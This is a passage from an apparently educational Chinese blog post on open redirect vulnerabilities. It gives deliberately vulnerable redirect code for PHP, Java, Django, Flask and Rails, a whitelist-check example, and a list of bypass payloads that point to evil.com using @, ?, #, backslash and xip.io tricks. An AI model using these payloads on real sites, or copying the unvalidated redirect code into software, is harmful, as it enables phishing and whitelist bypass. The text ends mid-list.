    <content type="html"><![CDATA[<h2 id="URL跳转漏洞学习总结"><a href="#URL跳转漏洞学习总结" class="headerlink" title="URL跳转漏洞学习总结"></a>URL跳转漏洞学习总结</h2><h3 id="相关背景"><a href="#相关背景" class="headerlink" title="相关背景"></a>相关背景</h3><p>现在web应用越来越多的需要和其他第三方应用交互，以及在自身应用内部根据不同的逻辑引向不同的页面。例如一个典型的场景就是：web站点可以使用第三方账号（如qq,微博等）进行登录，在登录时就会发生跳转，如果在这个过程中没有做好安全策略就会产生安全漏洞。例如可以利用恶意的URL跳转进行钓鱼等。</p><h3 id="URL重定向（301-302）"><a href="#URL重定向（301-302）" class="headerlink" title="URL重定向（301/302）"></a>URL重定向（301/302）</h3><ol><li>301重定向：当域名或者网址永久弃用后，为了方便可以将此域名或网址重定向到新的域名或URL</li><li>302重定向：当域名或网址临时弃用时，为了方便可以将此域名或网址重定向到新的域名或URL</li><li>302URL劫持与302任意URL跳转的不同点<ul><li>302——URL劫持是由于搜素引擎的算法导致的问题。例如A网站暂时弃用，要302重定向到B网站，但是由于B网站URL太过复杂，而搜索引擎的算法判定A网址更加适合，所以爬取的还是A网址，这个时候访问网站是显示的URL是A网站的，而显示的内容是B网站的，造成了302重定向——URL劫持。</li><li>302——任意URL跳转是用户可以直接控制URL跳转的参数或者通过一些绕过方式控制URL跳转的位置造成的问题。</li></ul></li></ol><h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>web站点或者第三方的服务端没有对用户输入的参数进行合法性校验，或者校验不严格，在URL跳转时用户可控，导致恶意参数的传入以及执行，将应用程序引导到恶意的第三方区域产生的安全问题（短链接更加难以防范）。</p><h4 id="漏洞出现的详细原因"><a href="#漏洞出现的详细原因" class="headerlink" title="漏洞出现的详细原因"></a>漏洞出现的详细原因</h4><ul><li>写代码时没有考虑过任意URL跳转漏洞，或者根本不知道/不认为这是个漏洞</li><li>写代码时考虑不周,用取子串、取后缀等方法简单判断，代码逻辑可被绕过</li><li>对传入参数做一些奇葩的操作(域名剪切/拼接/重组)和判断，适得其反，反被绕过</li><li>原始语言自带的解析URL、判断域名的函数库出现逻辑漏洞或者意外特性,可被绕过</li><li>原始语言、服务器/容器特性、浏览器等对标准URL协议解析处理等差异性导致被绕过</li></ul><h3 id="WEB站点中URL跳转漏洞的发生点"><a href="#WEB站点中URL跳转漏洞的发生点" class="headerlink" title="WEB站点中URL跳转漏洞的发生点"></a>WEB站点中URL跳转漏洞的发生点</h3><ul><li>用户登录、统一身份认证处、认证以后发生跳转</li><li>用户分享、收藏内容后会发生跳转</li><li>跨站点认证、在授权后会认证</li><li>站内对其他网站的链接，点击后会跳转</li></ul><h3 id="URL跳转的实现方式"><a href="#URL跳转的实现方式" class="headerlink" title="URL跳转的实现方式"></a>URL跳转的实现方式</h3><ul><li><p>通过META标签内跳转</p><ul><li><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"url"</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $url = $_REQUEST[<span class="string">"url"</span>];</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    $url = <span class="string">"url_meta.php"</span>;</span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Refresh"</span> <span class="attr">content</span>=<span class="string">"5; url=&lt;?php echo $url?&gt;"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542529489.94.png" alt></p></li></ul></li><li><p>通过JavaScript跳转</p><ul><li><p>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line">echo <span class="string">"&lt;script&gt;window.location.href=\"$target\"&lt;/script&gt;"</span>;</span><br><span class="line">exit;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">echo <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542529568.87.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542529591.92.png" alt></p></li></ul></li><li><p>通过header头跳转</p><ul><li><p>实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line">header(<span class="string">"Location: $target"</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>如果jump参数没有任何限制，用户就可以构造恶意链接进行提交造成恶意URL跳转 <code>http://www.lsowl.xyz/aaa.php?url=http://www.eval.com</code> ，通过恶意链接造成不可信的第三方跳转可以进一步钓鱼等(直接跳转)。</p></li><li><p>同时由于一些网站的安全策略，白名单中有 <code>http://www.lsowl.xyz/aaa.php</code> 而导致一些安全策略被绕过，导致用户最终访问的时恶意链接。（过滤不严格的白名单）</p></li></ul></li></ul><p>通过GET或POST的方式接收将要跳转的URL，然后通过上面的几种方式中的一种来跳转到目标URL。由于用户的输入会进入META，JavaScript，http头，所以都可能发生相应的上下文漏洞，如XSS等，同时URL跳转功能的特点，会在浏览器将用户从可信的站点跳转到不可信的站点，如果用户的输入带有敏感信息会泄露给不可信的第三方。</p><h3 id="常见的发生URL跳转的参数名"><a href="#常见的发生URL跳转的参数名" class="headerlink" title="常见的发生URL跳转的参数名"></a>常见的发生URL跳转的参数名</h3><ul><li>redirect</li><li>redirect_to</li><li>redirect_url</li><li>url</li><li>jump</li><li>jump_to</li><li>target</li><li>to</li><li>link</li><li>linkto</li><li>domain</li></ul><h3 id="几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）"><a href="#几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）" class="headerlink" title="几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）"></a>几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）</h3><ul><li><p>Java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.sendRedirect(request.getParameter(<span class="string">"url"</span>));</span><br></pre></td></tr></table></figure></li><li><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$redirect_url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">header(<span class="string">"Location: "</span> . $redirect_url);</span><br></pre></td></tr></table></figure></li><li><p>.NET</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string redirect_url = request.QueryString[&quot;url&quot;];</span><br><span class="line">Response.Redirect(redirect_url);</span><br></pre></td></tr></table></figure></li><li><p>Django</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">redirect_url = request.GET.get("url")</span></span><br><span class="line"><span class="xml">HttpResponseRedirect(redirect_url)</span></span><br></pre></td></tr></table></figure></li><li><p>Flask</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redirect_url = request.form[&apos;url&apos;]</span><br><span class="line">redirect(redirect_url)</span><br></pre></td></tr></table></figure></li><li><p>Rails</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect_to params[:url]</span><br></pre></td></tr></table></figure></li></ul><h3 id="网站后端对白名单限制（以PHP为例）"><a href="#网站后端对白名单限制（以PHP为例）" class="headerlink" title="网站后端对白名单限制（以PHP为例）"></a>网站后端对白名单限制（以PHP为例）</h3><ul><li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// $allowedDomains 表示允许跳转的url白名单</span></span><br><span class="line">$allowedDomains = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"aaaa.com"</span></span><br><span class="line">        <span class="string">"bbbb.com"</span></span><br><span class="line">        .......</span><br><span class="line">    );</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encodeUrl</span><span class="params">($urlInfo)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $path = <span class="keyword">isset</span>($urlInfo[<span class="string">'path'</span>]) ? $urlInfo[<span class="string">'path'</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($path))</span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">"/"</span>, $path);</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($t); $i++)</span><br><span class="line">            &#123;</span><br><span class="line">                $t[$i] = rawurlencode($t[$i]);             </span><br><span class="line">            &#125;</span><br><span class="line">            $path = implode(<span class="string">"/"</span>, $t);</span><br><span class="line">        &#125;</span><br><span class="line">        $query = <span class="keyword">isset</span>($urlInfo[<span class="string">'query'</span>]) ? $urlInfo[<span class="string">'query'</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($query))</span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">"&amp;"</span>, $query);</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($t); $i++)</span><br><span class="line">            &#123;</span><br><span class="line">                $tt = explode(<span class="string">"="</span>, $t[$i]);</span><br><span class="line">                $tt[<span class="number">1</span>] = rawurlencode($tt[<span class="number">1</span>]);</span><br><span class="line">                $t[$i] = implode(<span class="string">"="</span>, $tt);            </span><br><span class="line">            &#125;</span><br><span class="line">            $query = implode(<span class="string">"&amp;"</span>, $t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($urlInfo[<span class="string">'host'</span>]) || <span class="keyword">empty</span>($urlInfo[<span class="string">'host'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> $path. <span class="string">"?"</span>. $query;</span><br><span class="line">        &#125;</span><br><span class="line">        $scheme = <span class="keyword">isset</span>($urlInfo[<span class="string">'scheme'</span>]) ? $urlInfo[<span class="string">'scheme'</span>] : <span class="string">'http'</span>;</span><br><span class="line">        $port = <span class="keyword">isset</span>($urlInfo[<span class="string">'port'</span>]) ? $urlInfo[<span class="string">'port'</span>] : <span class="number">80</span>;</span><br><span class="line"> </span><br><span class="line">         </span><br><span class="line">        $request = $scheme . <span class="string">'://'</span>. $urlInfo[<span class="string">'host'</span>];</span><br><span class="line">        $request .= ($port == <span class="number">80</span>) ? <span class="string">''</span> : <span class="string">':'</span>.$port;</span><br><span class="line">        $request .= $path;</span><br><span class="line">        $request .= (<span class="keyword">empty</span>($query)) ? <span class="string">''</span> : <span class="string">'?'</span>.$query;</span><br><span class="line">        <span class="keyword">return</span> $request;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkUrl</span><span class="params">($url,$domainArr=array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $res = <span class="keyword">array</span>(<span class="string">'isTrustedDomain'</span> =&gt; <span class="keyword">false</span>,<span class="string">'url'</span> =&gt; <span class="string">''</span>,<span class="string">'domain'</span> =&gt; <span class="string">''</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($url))     <span class="keyword">return</span> $res;</span><br><span class="line">        $domainArr = <span class="keyword">empty</span>($domainArr) || !is_array($domainArr) ? $allowedDomains : $domainArr;</span><br><span class="line">        $url      = filterUrl($url);<span class="comment">//先过滤特殊字符</span></span><br><span class="line">        $p      = parse_url($url);</span><br><span class="line">        $scheme = $p[<span class="string">'scheme'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!in_array(strtolower($scheme),<span class="keyword">array</span>(<span class="string">'http'</span>,<span class="string">'https'</span>)))&#123;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        $host   = $p[<span class="string">'host'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!isValidHost($host))&#123;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">        $hostLen = strlen($host);</span><br><span class="line">        <span class="keyword">foreach</span>($domainArr <span class="keyword">as</span> $domain)&#123;</span><br><span class="line">            $firstPos = strpos($host, $domain);</span><br><span class="line">            <span class="keyword">if</span>($firstPos !== <span class="keyword">false</span> &amp;&amp; ($firstPos + strlen($domain)) == $hostLen)&#123;</span><br><span class="line">                 </span><br><span class="line">                <span class="keyword">if</span>($firstPos == <span class="number">0</span> || $domain[<span class="number">0</span>] == <span class="string">'.'</span> || $host[$firstPos<span class="number">-1</span>] == <span class="string">'.'</span>)&#123;</span><br><span class="line">                    $res[<span class="string">'isTrustedDomain'</span>] = <span class="keyword">true</span>;</span><br><span class="line">                    $res[<span class="string">'url'</span>]                         = $url;</span><br><span class="line">                    $res[<span class="string">'domain'</span>]              = $domain;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterUrl</span><span class="params">( $url )</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($url)) <span class="keyword">return</span> $url;</span><br><span class="line">        <span class="comment">// Strip all of the Javascript in script tags out...</span></span><br><span class="line">        $url = preg_replace(<span class="string">'/&lt;SCRIPT.*?&lt;\/SCRIPT&gt;/ims'</span>,<span class="string">""</span>,$url);</span><br><span class="line">        <span class="comment">// Strip all blank character</span></span><br><span class="line">        $url = preg_replace(<span class="string">'/[\s\v\0]+/'</span>,<span class="string">""</span>,$url);</span><br><span class="line">        <span class="comment">//Strip special characters(',",&lt;,&gt;,\)</span></span><br><span class="line">        $url = str_replace(<span class="keyword">array</span>(<span class="string">"'"</span>,<span class="string">"\""</span>,<span class="string">"&lt;"</span>,<span class="string">"&gt;"</span>,<span class="string">"\\"</span>),<span class="string">''</span>,$url);</span><br><span class="line">        <span class="keyword">return</span> $url;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidHost</span><span class="params">($host)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $p = <span class="string">"/^[0-9a-zA-Z\-\.]+$/"</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_match($p,$host) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line">     </span><br><span class="line">$url = <span class="string">"https://www.baidu.com"</span>;</span><br><span class="line">$call_back_url = trim($url);</span><br><span class="line">$call_back_url = encodeUrl(parse_url(urldecode($call_back_url)));</span><br><span class="line">$res = checkUrl($call_back_url, $domainArr);</span><br><span class="line"> </span><br><span class="line">var_dump($res);</span><br></pre></td></tr></table></figure></li></ul><h3 id="攻击方式及危害性"><a href="#攻击方式及危害性" class="headerlink" title="攻击方式及危害性"></a>攻击方式及危害性</h3><ul><li>恶意用户借助URL跳转构造钓鱼页面欺骗其他用户，以及获取敏感信息等，在有在线业务的站点危害较大。</li><li>借助URL跳转突破一些基于白名单的安全机制。如：传统的IM对URL的传播进行安全校验，但对于大站点的域名及URL直接允许通过并显示可信的URL，如果该URL中包含恶意跳转可能会导致安全限制被绕过。</li><li>基于白名单引用的资源，这种方式与上面的类似。比如：引入youku.com的视频，白名单中检测的时youku.com,如果包含恶意链接还是可能突破限制。</li><li>在带referer传输的站点中，就不只会产生任意URL跳转这个问题，同时可能会造成所有基于referer的安全策略失效（比较少见）</li></ul><h3 id="模拟跨域请求"><a href="#模拟跨域请求" class="headerlink" title="模拟跨域请求"></a>模拟跨域请求</h3><ul><li><p>在header头中跳转：（并没有带referer请求，所以这里只会产生任意URL及钓鱼诈骗等）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">url.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="comment">// 使服务端进行302跳转</span></span><br><span class="line">header(<span class="string">"Location: $target"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在JavaScript中跳转</span></span><br><span class="line"><span class="comment">// echo "&lt;script&gt;window.location.href=\"$target\"&lt;/script&gt;";</span></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">referer.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</span><br><span class="line">$referer = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"><span class="keyword">if</span> (strpos($referer, <span class="string">"127.0.0.1:81"</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"referer is true"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Wrong referer"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"referer is null"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问：<code>http://127.0.0.1:81/url.php?url=http://127.0.0.1:82/referer.php</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542530507.75.png" alt></p></li><li><p>在js中跳转（带referer传输，除了任意URL跳转漏洞之外还会绕过基于referer的所有安全策略）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542530750.79.png" alt></p></li></ul><h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><ul><li>抓取数据包中状态码为302的URL</li><li>修改目标地址</li><li>查看是否正常跳转（如果不存在直接返回到它自己的域名，如果存在则跳转）</li><li>尝试绕过</li><li>注意点：协议一致性问题。有些网站校验跳转后的协议必须为HTTPS，有时候无法跳转并不会提示。</li></ul><h3 id="常见的绕过方式（利用浏览器对URL特性的支持）"><a href="#常见的绕过方式（利用浏览器对URL特性的支持）" class="headerlink" title="常见的绕过方式（利用浏览器对URL特性的支持）"></a>常见的绕过方式（利用浏览器对URL特性的支持）</h3><ol><li><p>“@”  （在Firefox中使用会有弹窗提示，其他浏览器没有）</p><p><code>http://www.target.com/redirecturl=http://whitelist.com@evil.com</code></p></li><li><p>“.”</p><p><code>http://www.target.com/redirecturl=.eval.com</code></p></li><li><p>“/”</p><p><code>http://www.target.com/redirecturl=http://evil.com/whitelist.com</code></p><p><code>http://www.target.com/redirecturl=/http://evil.com</code></p></li><li><p>“\”</p><p><code>http://www.target.com/redirecturl=http://evil.com\a.whitelist.com</code></p></li><li><p>“\\”</p><p><code>http://www.target.com/redirecturl=http://evil.com\\a.whitelist.com</code></p></li><li><p>“\.”</p><p><code>http://www.target.com/redirecturl=http://evil.com\.a.whitelist.com</code></p></li><li><p>“?”</p><p><code>http://www.target.com/redirecturl=http://evil.com?a.whitelist.com</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用问号，这是一个特性，利用问号可以成功绕过URL限制</span><br><span class="line">比如：http://www.aaa.com/acb?Url=http://login.aaa.com 这是一个跳转链接，跳转到它的二级域名下，那么这个问号放哪里可以绕过呢？其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：http://www.aaa.com/acb?Url=http://test.com?login.aaa.com 那么，它其实是会跳转到这个test.com域名下，这个域名是我想要跳转的任意域名，而后面的它自身域名一定要带上，不带上就无法辅助用问号?这个特性来跳转到指定域名了，而跳转后，问号和问号后面的内容会变为这样：http://www.test.com/?login.aaa.com</span><br></pre></td></tr></table></figure></li><li><p>“#”</p><p><code>http://www.target.com/redirecturl=http://evil.com#a.whitelist.com</code></p></li><li><p>利用白名单缺陷绕过限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">有些域名白名单限制不严格。</span><br><span class="line">1. 检测是否是当前域名</span><br><span class="line">http://www.aaa.com/acb?Url=http://login.aaa.com在访问后会跳转到login.aaa.com，如果它的白名单显示不严格，将login.aaa.com改成aaa.com同样可以跳转，到这里都是合法的跳转。这时只要构造一个第三方的域名中包含aaa.com的url就可以成功跳转。如果恰好有这样一个域名，恭喜你；如果没有，就需要买一个域名。emmm..在国内这样很亏</span><br><span class="line"></span><br><span class="line">2.域名字符串检测欺骗</span><br><span class="line">http://www.aaa.com/acb?Url=http://login.aaa.com，检测login.aaa.com，直接修改为：http://www.aaa.com/acb?Url=http://login.aaa.com.www.eval.com</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542520860.14.png" alt></p></li><li><p>利用多重验证&amp;跳转绕过限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">现在的许多网站都有多重验证。例如：在登录账户以后会出现另一个验证，输入手机号进行验证，这时可能存在任意URL跳转的问题。具体如下：</span><br><span class="line">http://www.aaa.com/acb?Url=http:...http://login.aaa.com,这里只需要修改最后的URL来绕过限制</span><br></pre></td></tr></table></figure></li><li><p>点击触发达到绕过URL跳转的限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在许多的登录的位置，URL是一个跳转的地址。比如：http://www.aaa.com/acb?Url=http://login.aaa.com;这个时候只要将login.aaa.com修改为任意URL;这时界面没有发生变化，当用户输入账号密码点击登录按钮时会触发跳转。</span><br><span class="line">需要注意的是：这里不一定要输入正确的账号密码进行跳转，有些需要，视具体的站点而定</span><br></pre></td></tr></table></figure></li><li><p>利用xip.io绕过限制（还可以借鉴其余的SSRF绕过方法）</p><p><code>http://www.aaa.com/acb?Url=http://login.aaa.com.eval.com.xip.io</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在SSRF读取内网地址的时候会有许多限制，有时候可以利用xip.io直接绕过限制读取，这里可以引用这个方法，直接将可以跳转的位置的地址后添加为任意url+xip.io，如果可以存在则将跳转的地址解析到后面的恶意url进行跳转。</span><br></pre></td></tr></table></figure></li><li><p>利用超链接绕过可信站点的限制（可信站多次重定向）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span 